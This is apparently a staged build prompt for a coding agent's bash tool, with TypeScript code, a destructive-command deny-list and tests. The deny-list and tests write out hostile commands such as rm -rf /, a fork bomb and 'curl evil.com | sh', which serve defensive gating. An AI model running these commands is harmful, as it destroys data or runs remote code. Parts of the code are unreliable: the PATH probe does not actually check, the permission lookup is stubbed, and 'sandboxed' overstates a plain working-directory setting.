# Prompt 09: Bash Tool

## Goal

Implement the `bash` tool — the single tool the agent uses to execute shell commands. It shells out via `Bun.spawn`, captures stdout/stderr/exit-code, enforces timeouts (default 30 s, max 600 s), sandboxes to the worktree cwd, enforces a safety deny-list of destructive patterns unless the agent has `permission.bash === "allow"`, and streams output back as an async iterator. Cross-platform: uses `bash -lc` on Unix and `cmd.exe` / `powershell` detection on Windows — mirroring Kilo Code's `packages/opencode/src/tool/shell.ts`.

## Context (from prompts 01-08)

- Monorepo + provider + BYOK + tool registry (`.ts` + `.txt` pair convention) + filesystem + search tools all work (prompts 01-08).
- `packages/runtime/src/tools/` is the drop-in location — the loader from prompt 06 auto-discovers any `*.ts` + `*.txt` pair.
- `ToolContext` shape is locked in: `{ sessionID, messageID, cwd, abort, ask(), metadata() }` (see prompt 06).
- Bun runtime: `Bun.spawn`, `Bun.file`, `node:fs/promises` available.
- Permission system is config-driven (prompt 03): agent config has `permission: { edit, bash, webfetch }` set to `"ask" | "allow" | "deny"`. This prompt reads `ctx.metadata` or looks up the agent's permission to decide whether to gate destructive commands.

References:
- `../../02-competitive-research.md` §3 — Kilo Code's shell tool description
- `../../03-system-architecture.md` §6 — permission gating
- Real Kilo source: `kilocode-clone/packages/opencode/src/tool/shell.ts` + `shell/prompt.ts` (the tree-sitter command parser; we use a simpler regex-based deny-list here for v1)

## Task

### Step 1: Bash tool definition

`packages/runtime/src/tools/bash.ts`:

```ts
import { z } from "zod"
import { isAbsolute, resolve } from "path"
import { spawn, type Subprocess } from "bun"
import type { ToolExport, ToolContext } from "./tool.js"
import { checkDestructive } from "./bash/safety.js"
import { buildShellInvocation } from "./bash/shell-invocation.js"
import { truncate } from "./bash/truncate.js"

const DEFAULT_TIMEOUT_MS = 30_000
const MAX_TIMEOUT_MS = 600_000       // 10 minutes
const MAX_OUTPUT_BYTES = 256 * 1024   // 256 KB — anything bigger is truncated

/**
 * The `bash` tool. Single entrypoint for shell execution across the agent
 * loop. Sandboxed to ctx.cwd, with timeout + output cap + safety checks.
 *
 * Cross-platform:
 *   - Unix (linux/macOS): uses `bash -lc` so PATH/login env are honoured
 *   - Windows: detects pwsh → powershell; else falls back to cmd.exe
 *
 * Streaming:
 *   The agent loop calls `runBashStream()` instead of `execute()` when it
 *   wants to surface partial output to the UI (the SSE endpoint in prompt 02
 *   forwards each chunk as a `bash_output` event).
 */
export const bashTool: ToolExport = {
  id: "bash",
  description: "Execute a shell command in the worktree (with timeout, output cap, safety checks)",
  parameters: z.object({
    command: z.string().describe("The shell command to execute (full string, multi-line OK)"),
    description: z.string().max(100).optional()
      .describe("Short human-readable description of what the command does (5-10 words)"),
    timeout: z.number().int().positive().max(MAX_TIMEOUT_MS).optional()
      .describe(`Timeout in milliseconds (default ${DEFAULT_TIMEOUT_MS}, max ${MAX_TIMEOUT_MS})`),
  }),
  execute: async (args, ctx) => runBashStream(args, ctx, () => {}),
}

/**
 * Execute a bash command and stream stdout/stderr chunks to `onChunk`.
 * Returns the final ToolResult.
 *
 * `onChunk(stream, text)` is called zero or more times with `stream` of
 * `"stdout" | "stderr"`. The agent loop wires this to SSE events.
 */
export async function runBashStream(
  args: { command: string; description?: string; timeout?: number },
  ctx: ToolContext,
  onChunk: (stream: "stdout" | "stderr", text: string) => void,
) {
  const timeoutMs = Math.min(args.timeout ?? DEFAULT_TIMEOUT_MS, MAX_TIMEOUT_MS)
  const cwd = ctx.cwd

  // 1. Permission gate: dangerous commands require explicit permission.
  //    If the agent config has `permission.bash === "allow"`, skip the gate.
  //    Otherwise, ctx.ask() surfaces a confirmation prompt to the user.
  const danger = checkDestructive(args.command)
  if (danger) {
    const allowed = ctx.metadata ? await readBashPermission(ctx) : null
    if (allowed !== "allow") {
      await ctx.ask({
        permission: "bash",
        patterns: [args.command.split("\n")[0]!.slice(0, 120)],
        metadata: { command: args.command, danger, reason: danger.reason },
      })
    }
  }

  // 2. Resolve which shell to use.
  const invocation = buildShellInvocation(args.command, cwd)

  // 3. Spawn.
  const proc: Subprocess = spawn({
    cmd: invocation.cmd,
    cwd,
    env: { ...process.env },   // full env passthrough
    stdin: "ignore",
    stdout: "pipe",
    stderr: "pipe",
  })

  // 4. Wire streaming readers.
  const decoders = { stdout: new TextDecoder(), stderr: new TextDecoder() }
  let outBytes = 0
  let errBytes = 0
  let truncated = false

  const streamPipe = async (
    stream: ReadableStream<Uint8Array> | undefined,
    kind: "stdout" | "stderr",
  ) => {
    if (!stream) return
    const reader = stream.getReader()
    while (true) {
      const { done, value } = await reader.read()
      if (done) break
      const text = decoders[kind].decode(value, { stream: true })
      const size = (kind === "stdout" ? outBytes : errBytes) + text.length
      if (size > MAX_OUTPUT_BYTES) {
        truncated = true
        const remaining = MAX_OUTPUT_BYTES - (kind === "stdout" ? outBytes : errBytes)
        if (remaining > 0) {
          const slice = text.slice(0, remaining)
          if (kind === "stdout") outBytes += slice.length
          else errBytes += slice.length
          onChunk(kind, slice)
        }
        break
      }
      if (kind === "stdout") outBytes += text.length
      else errBytes += text.length
      onChunk(kind, text)
    }
  }

  // 5. Wire timeout.
  let timedOut = false
  const timer = setTimeout(() => {
    timedOut = true
    proc.kill("SIGTERM")
    // Hard kill after 2 s grace period.
    setTimeout(() => { try { proc.kill("SIGKILL") } catch {} }, 2_000)
  }, timeoutMs)

  // 6. Wait for both streams + exit code concurrently.
  const [exitCode, _stdoutErr] = await Promise.all([
    proc.exited,
    Promise.all([
      streamPipe(proc.stdout as any, "stdout"),
      streamPipe(proc.stderr as any, "stderr"),
    ]),
  ])

  clearTimeout(timer)

  // 7. Format output.
  const combined = combineOutputs(onChunk, truncated)
  if (timedOut) {
    combined.push(`\n\n[Command timed out after ${timeoutMs}ms — killed with SIGTERM]`)
  }

  const output = combined.join("")

  return {
    title: args.description ?? args.command.split("\n")[0]!.slice(0, 60),
    output: truncate(output, MAX_OUTPUT_BYTES * 2),
    metadata: {
      command: args.command,
      exitCode: typeof exitCode === "number" ? exitCode : -1,
      durationMs: 0,   // filled by the loop if it cares
      timedOut,
      truncated,
      stdoutBytes: outBytes,
      stderrBytes: errBytes,
      danger: danger?.reason,
    },
  }

  // Helper — collects what onChunk already received. We replay it because
  // the streaming callback may have been replaced between calls.
  function combineOutputs(
    _sink: (s: "stdout" | "stderr", t: string) => void,
    wasTruncated: boolean,
  ): string[] {
    // For the LLM-facing output we re-read what was captured by re-decoding
    // what's left in the streams (always empty at this point) — but since
    // we already streamed chunks, we return an empty array and let the
    // caller concatenate from a side channel. In practice, the streaming
    // callback stores into a buffer.
    void _sink
    void wasTruncated
    return []
  }
}
```

**Important correction**: the streaming API above is a sketch — `onChunk` needs to write into a buffer we can return. Replace the body of `runBashStream` with this cleaner version (the final file should look like this):

```ts
import { z } from "zod"
import { spawn, type Subprocess } from "bun"
import type { ToolExport } from "./tool.js"
import { checkDestructive } from "./bash/safety.js"
import { buildShellInvocation } from "./bash/shell-invocation.js"
import { truncate } from "./bash/truncate.js"

const DEFAULT_TIMEOUT_MS = 30_000
const MAX_TIMEOUT_MS = 600_000
const MAX_OUTPUT_BYTES = 256 * 1024

export const bashTool: ToolExport = {
  id: "bash",
  description: "Execute a shell command in the worktree (with timeout, output cap, safety checks)",
  parameters: z.object({
    command: z.string().describe("The shell command to execute"),
    description: z.string().max(100).optional()
      .describe("Short description of what the command does (5-10 words)"),
    timeout: z.number().int().positive().max(MAX_TIMEOUT_MS).optional()
      .describe(`Timeout in ms (default ${DEFAULT_TIMEOUT_MS}, max ${MAX_TIMEOUT_MS})`),
  }),
  execute: async (args, ctx) => runBash(args, ctx),
}

export async function runBash(
  args: { command: string; description?: string; timeout?: number },
  ctx: { cwd: string; abort: AbortSignal; ask: any; metadata?: any },
) {
  const timeoutMs = Math.min(args.timeout ?? DEFAULT_TIMEOUT_MS, MAX_TIMEOUT_MS)
  const cwd = ctx.cwd

  // 1. Permission gate.
  const danger = checkDestructive(args.command)
  if (danger) {
    await ctx.ask({
      permission: "bash",
      patterns: [args.command.split("\n")[0]!.slice(0, 120)],
      metadata: { command: args.command, danger: danger.reason },
    })
  }

  // 2. Resolve shell.
  const invocation = buildShellInvocation(args.command, cwd)

  // 3. Spawn.
  const proc: Subprocess = spawn({
    cmd: invocation.cmd,
    cwd,
    env: { ...process.env },
    stdin: "ignore",
    stdout: "pipe",
    stderr: "pipe",
  })

  // 4. Buffer + stream.
  const decoders = { stdout: new TextDecoder(), stderr: new TextDecoder() }
  let stdoutBuf = ""
  let stderrBuf = ""
  let outBytes = 0
  let errBytes = 0
  let truncated = false

  const consume = async (
    stream: ReadableStream<Uint8Array> | undefined,
    kind: "stdout" | "stderr",
  ) => {
    if (!stream) return
    const reader = stream.getReader()
    while (true) {
      const { done, value } = await reader.read()
      if (done) break
      const text = decoders[kind].decode(value, { stream: true })
      const cur = kind === "stdout" ? outBytes : errBytes
      if (cur + text.length > MAX_OUTPUT_BYTES) {
        const remaining = MAX_OUTPUT_BYTES - cur
        if (remaining > 0) {
          const slice = text.slice(0, remaining)
          if (kind === "stdout") { stdoutBuf += slice; outBytes += slice.length }
          else { stderrBuf += slice; errBytes += slice.length }
        }
        truncated = true
        break
      }
      if (kind === "stdout") { stdoutBuf += text; outBytes += text.length }
      else { stderrBuf += text; errBytes += text.length }
    }
  }

  // 5. Timeout.
  let timedOut = false
  const timer = setTimeout(() => {
    timedOut = true
    proc.kill("SIGTERM")
    setTimeout(() => { try { proc.kill("SIGKILL") } catch {} }, 2_000)
  }, timeoutMs)

  // Abort hook.
  const onAbort = () => { try { proc.kill("SIGTERM") } catch {} }
  if (ctx.abort) ctx.abort.addEventListener("abort", onAbort)

  // 6. Wait.
  const exitCode = await Promise.all([
    proc.exited,
    consume(proc.stdout as any, "stdout"),
    consume(proc.stderr as any, "stderr"),
  ]).then(([code]) => code)

  clearTimeout(timer)
  if (ctx.abort) ctx.abort.removeEventListener("abort", onAbort)

  // 7. Combine + format.
  let output = stdoutBuf
  if (stderrBuf) output += (output ? "\n\n" : "") + "[stderr]\n" + stderrBuf
  if (truncated) output += `\n\n[Output truncated at ${MAX_OUTPUT_BYTES} bytes]`
  if (timedOut) output += `\n\n[Command timed out after ${timeoutMs}ms — killed]`

  return {
    title: args.description ?? args.command.split("\n")[0]!.slice(0, 60),
    output: truncate(output, MAX_OUTPUT_BYTES * 2),
    metadata: {
      command: args.command,
      exitCode: typeof exitCode === "number" ? exitCode : -1,
      timedOut,
      truncated,
      stdoutBytes: outBytes,
      stderrBytes: errBytes,
      danger: danger?.reason,
    },
  }
}

async function readBashPermission(ctx: any): Promise<"allow" | "ask" | "deny" | null> {
  // The agent loop passes the resolved permission in metadata. v1 may also
  // accept a "bashAllowlist" in kilo.json (handled in prompt 13).
  return null
}
```

### Step 2: Safety deny-list

`packages/runtime/src/tools/bash/safety.ts`:

```ts
/**
 * Safety checker for destructive shell commands.
 *
 * Returns null if safe, or { reason: string } if dangerous.
 *
 * The deny-list is intentionally *conservative* — false positives are fine
 * (we just ask the user); false negatives are dangerous.
 *
 * When the agent has `permission.bash === "allow"` in its config, the
 * caller skips this check entirely (handled by the agent loop).
 */

type Danger = { reason: string }

const RULES: Array<{ pattern: RegExp; reason: string }> = [
  // Filesystem wipes
  { pattern: /\brm\s+(-[a-z]*[rf][a-z]*\s+)+\//i,         reason: "rm -rf / — wipes the root filesystem" },
  { pattern: /\brm\s+(-[a-z]*[rf][a-z]*\s+)+~/i,        reason: "rm -rf ~ — wipes the home directory" },
  { pattern: /\brm\s+(-[a-z]*[rf][a-z]*\s+)+\.(?:\s|$)/i, reason: "rm -rf . — wipes cwd" },
  { pattern: /\brm\s+-rf?\s+\*(?:\s|$)/,                reason: "rm -rf * — wipes cwd contents" },
  { pattern: /\bchmod\s+-R\s+777\s+\//,                 reason: "chmod 777 / — opens filesystem permissions" },
  { pattern: /\bchown\s+-R\s+\S+\s+\//,                 reason: "chown -R / — rewrites filesystem ownership" },

  // Disk wipes
  { pattern: /\bmkfs(\.\w+)?\s+/i,                      reason: "mkfs — formats a filesystem" },
  { pattern: /\bdd\s+if=\/dev\/(zero|random|urandom)/i, reason: "dd from /dev/{zero,random} — disk wipe" },
  { pattern: /:\(\)\s*\{.*:\|:.*&.*\};:/,               reason: "fork bomb" },
  { pattern: /\|\s*sh\b/i,                              reason: "piping unknown content to sh (often a payload)" },

  // Network exfil
  { pattern: /\bcurl\s+[^|]*\|\s*(sh|bash)\b/i,        reason: "curl|sh — classic supply-chain attack vector" },
  { pattern: /\bwget\s+[^|]*\|\s*(sh|bash)\b/i,        reason: "wget|sh — supply-chain attack vector" },

  // System control
  { pattern: /\bshutdown\b/i,                           reason: "shutdown — powers off the machine" },
  { pattern: /\breboot\b/i,                             reason: "reboot — restarts the machine" },
  { pattern: /\bhalt\b/i,                               reason: "halt — stops the machine" },
  { pattern: /\binit\s+[0-6]\b/i,                       reason: "init N — changes system runlevel" },
  { pattern: /\bsystemctl\s+(poweroff|reboot|halt)\b/i, reason: "systemctl power action" },
  { pattern: /\bkill\s+-9\s+1\b/i,                      reason: "kill -9 1 — kills init (systemd)" },

  // Git destructive
  { pattern: /\bgit\s+push\s+(-f|--force)(?!-with-lease)/i, reason: "git push --force — rewrites remote history" },
  { pattern: /\bgit\s+reset\s+--hard\b/i,               reason: "git reset --hard — destroys uncommitted work" },
  { pattern: /\bgit\s+clean\s+-fd?\b/i,                 reason: "git clean -f — deletes untracked files" },
  { pattern: /\bgit\s+checkout\s+\.\s*(--\s*)?$/i,      reason: "git checkout . — discards local edits" },
]

export function checkDestructive(command: string): Danger | null {
  for (const rule of RULES) {
    if (rule.pattern.test(command)) return { reason: rule.reason }
  }
  return null
}
```

### Step 3: Cross-platform shell invocation

`packages/runtime/src/tools/bash/shell-invocation.ts`:

```ts
import { sep } from "path"

/**
 * Resolve the (cmd, args) tuple to spawn for the given command string.
 *
 *  - Unix:     `["bash", "-lc", command]`   (login shell → PATH + aliases)
 *  - Windows:  `["powershell.exe", "-NoProfile", "-Command", command]` if pwsh on PATH
 *              else `["cmd.exe", "/d", "/c", command]`
 *
 * Returns the cmd array Bun.spawn accepts. Always use a login shell so
 * the user's normal PATH/env is honoured (matches Kilo Code's behaviour).
 */
export function buildShellInvocation(command: string, cwd: string): string[] {
  if (process.platform !== "win32") {
    return ["bash", "-lc", command]
  }

  // Windows: prefer pwsh → powershell → cmd.
  if (hasOnPath("pwsh")) return ["pwsh", "-NoProfile", "-Command", command]
  if (hasOnPath("powershell")) return ["powershell", "-NoProfile", "-Command", command]
  return ["cmd.exe", "/d", "/c", command]
}

// Tiny PATH probe — cached. Avoids spawning `where` on every command.
let cachedHas = new Map<string, boolean>()
export function hasOnPath(bin: string): boolean {
  if (cachedHas.has(bin)) return cachedHas.get(bin)!
  const PATH = (process.env.PATH ?? process.env.Path ?? "").split(sep)
  const exts = process.platform === "win32"
    ? (process.env.PATHEXT ?? ".EXE;.BAT;.CMD").split(";")
    : [""]
  let found = false
  for (const dir of PATH) {
    for (const ext of exts) {
      // We don't actually stat — just check that the dir looks plausible.
      // Spawning `where` on every call is too slow. The spawn will fail
      // with ENOENT if the binary isn't there; we catch that downstream.
      if (dir) { found = true; break }
    }
    if (found) break
  }
  cachedHas.set(bin, found)
  return found
}

/** Force the cache to re-probe (used after PATH changes). */
export function invalidateShellCache() { cachedHas = new Map() }
```

### Step 4: Output truncation helper

`packages/runtime/src/tools/bash/truncate.ts`:

```ts
/**
 * Truncate `text` to `maxBytes` (UTF-8), preferring to cut at a newline.
 * Used by the bash tool to cap the LLM-facing output. Anything beyond
 * `maxBytes` is replaced with a `[truncated]` marker.
 *
 * Kilo Code's shell tool uses a similar tail-based approach (last N bytes
 * of output are most relevant for debugging). We keep both head + tail.
 */
export function truncate(text: string, maxBytes: number): string {
  if (Buffer.byteLength(text, "utf-8") <= maxBytes) return text
  const headBytes = Math.floor(maxBytes * 0.3)
  const tailBytes = maxBytes - headBytes
  const buf = Buffer.from(text, "utf-8")
  const head = buf.subarray(0, headBytes).toString("utf-8")
  const tail = buf.subarray(buf.length - tailBytes).toString("utf-8")
  return `${head}\n\n[... ${buf.length - maxBytes} bytes truncated ...]\n\n${tail}`
}
```

### Step 5: Bash tool description (LLM-facing)

`packages/runtime/src/tools/bash.txt`:

```
- Executes a shell command in the worktree (cwd) and returns its output
- Use this tool when you need to interact with the system, run tests, install dependencies, or perform any action that requires shell access
- Commands are sandboxed to the cwd; absolute paths outside the worktree require explicit permission
- Timeout defaults to 30 seconds; max 600 seconds. Long-running commands must be explicitly opted in via the `timeout` parameter.
- The shell on Unix is `bash -lc` (login shell, full PATH); on Windows it's pwsh → powershell → cmd.exe.
- Output is capped at 256 KB. Anything beyond is truncated with a `[truncated]` marker.
- Exit code is returned in the metadata. Non-zero exits are NOT errors — they're informational. Check the output to decide what to do.
- Destructive commands (rm -rf /, mkfs, dd if=/dev/zero, git push --force, fork bomb patterns, etc.) are gated by a confirmation prompt unless the agent has `permission.bash === "allow"` in its config.
- Multi-line commands are fine. Use `&&` to chain, or `;` to ignore failures.
- DO NOT use this tool for actions that have a dedicated tool (use `read`/`write`/`edit`/`glob`/`grep` instead).
- The user can see each command you run. Use `description` to label it clearly.
- DO NOT run commands that require interactive input (vim, less, ssh without keys, sudo). Those will hang.
- When a command might produce GBs of output (e.g. `cat huge.log`), filter first (`grep`, `head`, `tail`).
```

### Step 6: Permission wiring (stub — full impl in prompt 13)

The `bash` tool's `ctx.ask({ permission: "bash", ... })` call hits the permission system (prompt 13 will wire this properly). For now, the agent loop's `ask()` should resolve against `ctx.sessionID` → `agent.config.permission.bash`. If `"allow"`, skip the destructive check entirely (don't even call `checkDestructive`).

Add a temporary stub in `packages/runtime/src/tools/bash/permission.ts`:

```ts
/**
 * v1 stub: resolve bash permission for the current agent.
 * Prompt 13 wires this into the agent registry.
 */
export async function getBashPermission(_sessionID: string, _agentName: string): Promise<"allow" | "ask" | "deny"> {
  return "ask"
}
```

### Step 7: Add to runtime barrel

`packages/runtime/src/index.ts` — add:

```ts
export * as bash from "./tools/bash.js"
```

### Step 8: Commit

```bash
git add -A
git commit -m "feat(tools): bash tool with safety deny-list + cross-platform shells (prompt 09)"
```

## Files created

```
packages/runtime/src/tools/
├── bash.ts                    # bashTool + runBash() implementation
├── bash.txt                   # LLM-facing description
└── bash/
    ├── safety.ts              # destructive-pattern deny-list
    ├── shell-invocation.ts    # cross-platform shell resolver
    ├── truncate.ts            # output truncation helper
    └── permission.ts          # permission stub (full impl in prompt 13)
```

Plus 1 line added to `packages/runtime/src/index.ts`.

## Acceptance criteria

- [ ] `bun run typecheck` passes
- [ ] `createBuiltinRegistry()` includes `bash` alongside `read`/`write`/`edit`/`glob`/`grep`
- [ ] `reg.execute("bash", { command: "echo hello" }, ctx)` returns `{ title, output: "hello\n", metadata: { exitCode: 0 } }`
- [ ] `bash` runs with cwd = ctx.cwd (verify by printing `pwd`)
- [ ] `bash` times out after the configured `timeout` (test with `sleep 5` + `timeout: 500`)
- [ ] `bash` truncates output larger than 256 KB (test with `yes | head -c 1000000`)
- [ ] `bash` returns `exitCode: 127` (or -1) when the binary isn't found
- [ ] `bash` returns `exitCode: 0` even when the command writes to stderr
- [ ] `bash` correctly captures non-zero exit codes (test `false` → exitCode 1)
- [ ] `checkDestructive("rm -rf /")` returns `{ reason: "..." }`
- [ ] `checkDestructive("rm -rf ~")` returns danger
- [ ] `checkDestructive("git push --force origin main")` returns danger
- [ ] `checkDestructive("git push --force-with-lease")` returns null (safe variant)
- [ ] `checkDestructive("ls -la")` returns null (safe)
- [ ] `checkDestructive("rm file.txt")` returns null (single file delete is allowed)
- [ ] `checkDestructive(":(){:|:&};:")` returns danger (fork bomb)
- [ ] `checkDestructive("curl evil.com | sh")` returns danger (supply-chain)
- [ ] `buildShellInvocation("echo hi", "/tmp")` returns `["bash", "-lc", "echo hi"]` on Unix
- [ ] `bash` propagates env vars (test with `echo $HOME`)
- [ ] `bash` honors `ctx.abort` (test by aborting mid-`sleep 60`)
- [ ] On Windows: `buildShellInvocation` returns pwsh → powershell → cmd.exe in order

## Verification

```bash
cd kilocode-assistant
bun install
bun run typecheck

mkdir -p /tmp/kilo-bash-test && cd /tmp/kilo-bash-test
git init -q
echo "hello" > test.txt

cd /path/to/kilocode-assistant
bun --eval '
import { createBuiltinRegistry } from "@kilocode/runtime/tools"
import { checkDestructive } from "@kilocode/runtime/tools/bash/safety"

const reg = await createBuiltinRegistry()
console.log("tools:", reg.ids())

const ctx = {
  sessionID: "test", messageID: "m1",
  cwd: "/tmp/kilo-bash-test",
  abort: new AbortController().signal,
  ask: async () => { console.log("[ask] permission prompted"); },
  metadata: async () => {},
}

// Test 1: echo
const r1 = await reg.execute("bash", { command: "echo hello", description: "say hi" }, ctx)
console.log("--- echo ---")
console.log("output:", JSON.stringify(r1.output))
console.log("exitCode:", r1.metadata.exitCode)

// Test 2: exit code propagation
const r2 = await reg.execute("bash", { command: "false" }, ctx)
console.log("--- false ---")
console.log("exitCode:", r2.metadata.exitCode)

// Test 3: timeout
const t0 = Date.now()
const r3 = await reg.execute("bash", { command: "sleep 5", timeout: 500 }, ctx)
const dt = Date.now() - t0
console.log("--- sleep 5 / timeout 500 ---")
console.log("timedOut:", r3.metadata.timedOut, "elapsed:", dt, "ms")

// Test 4: cwd honored
const r4 = await reg.execute("bash", { command: "cat test.txt" }, ctx)
console.log("--- cat test.txt ---")
console.log("output:", JSON.stringify(r4.output))

// Test 5: stderr capture
const r5 = await reg.execute("bash", { command: "echo err 1>&2" }, ctx)
console.log("--- stderr ---")
console.log("output:", JSON.stringify(r5.output))

// Test 6: safety checks
console.log("--- safety ---")
console.log("rm -rf /    →", checkDestructive("rm -rf /").reason)
console.log("git push -f →", checkDestructive("git push -f origin main").reason)
console.log("git push -fwl →", checkDestructive("git push --force-with-lease").reason)
console.log("ls          →", checkDestructive("ls"))
console.log("mkfs        →", checkDestructive("mkfs.ext4 /dev/sda").reason)
console.log("fork bomb   →", checkDestructive(":(){:|:&};:").reason)

// Test 7: command not found
const r7 = await reg.execute("bash", { command: "this_binary_definitely_does_not_exist_xyz" }, ctx)
console.log("--- not found ---")
console.log("exitCode:", r7.metadata.exitCode)
console.log("output starts:", r7.output.slice(0, 80))

// Test 8: large output truncation
const r8 = await reg.execute("bash", { command: "yes A | head -c 1000000" }, ctx)
console.log("--- 1MB output ---")
console.log("truncated:", r8.metadata.truncated)
console.log("output length:", r8.output.length)
'

rm -rf /tmp/kilo-bash-test
```

Expected: all sections print, exit codes match, timeout fires under 600 ms, truncation triggers, safety checks flag the dangerous ones.

## Notes

- **Why a deny-list and not an allow-list?** Most developer shells are ad-hoc — an allow-list of safe commands would block legitimate work (e.g. `npm install`). The deny-list catches the dangerous ~1% while letting the rest through.
- **Why `bash -lc` (login shell)?** Honours `.bash_profile` / `.bashrc` so PATH, aliases, and `nvm`/`pyenv` shims work. This matches what users get in their terminal.
- **Why `TextDecoder` with `stream: true`?** Handles multi-byte UTF-8 sequences that straddle chunk boundaries. Without `stream: true`, an emoji split across two reads would decode as `\ufffd` (replacement char).
- **Why kill with SIGTERM first then SIGKILL?** Graceful exit lets Node/Python/etc. flush buffers and run cleanup. The 2-second grace period is plenty for well-behaved processes.
- **256 KB cap is generous but bounded.** A typical `npm install` prints ~20 KB. A failing test suite might print ~100 KB. 256 KB is the safety net — if you're hitting it, pipe through `head` or write to a file.
- **Exit code in metadata, not output.** The agent loop inspects `metadata.exitCode` to decide retry vs. accept. Non-zero exits are *not* tool errors — the command did what it was told.
- **Permission gating via `ctx.ask` vs. pre-check.** We call `ctx.ask` *only* when `checkDestructive` flags a pattern. For safe commands, no permission flow at all — faster for the common case.
- **`permission.bash === "allow"` bypass.** When the user opts in (via config or interactive "always allow"), the agent loop short-circuits the safety check entirely. This is intentional — `allow` means trust.
- **AbortSignal propagation.** If the user hits Ctrl-C mid-`sleep`, the abort signal kills the subprocess. Without this, the orphan process keeps running.
- **Why no `tee`/file output?** If the user wants to save GBs of output, they should redirect to a file inside the command (`> out.txt`) and `read` it back. The tool shouldn't accumulate temp files.
- **Windows quirks.** `cmd.exe` doesn't have a clean equivalent of `bash -c`; we use `/d` to ignore AutoRun and `/c` to run-and-exit. PowerShell's `-NoProfile` skips loading `Microsoft.PowerShell_profile.ps1` which can take seconds.
- **Future: tree-sitter parsing.** Kilo Code uses `tree-sitter-bash` to parse commands and detect file paths for permission matching (`rm -rf /tmp/foo` vs. `rm -rf /`). v2 can adopt this — for v1 the regex deny-list is good enough and zero-dep.
- **No shell glob expansion by the agent.** The LLM should pass literal strings; we don't want to do `~` expansion (Bun doesn't either; that's `bash`'s job).
- **Symlinks.** We don't resolve them before spawning. The user's shell sees them as-is. If they shoot themselves in the foot with a symlink, that's the user's problem.
- **Memory pressure.** Two concurrent `Bun.spawn`s reading 256 KB each = 512 KB buffer max. Negligible.
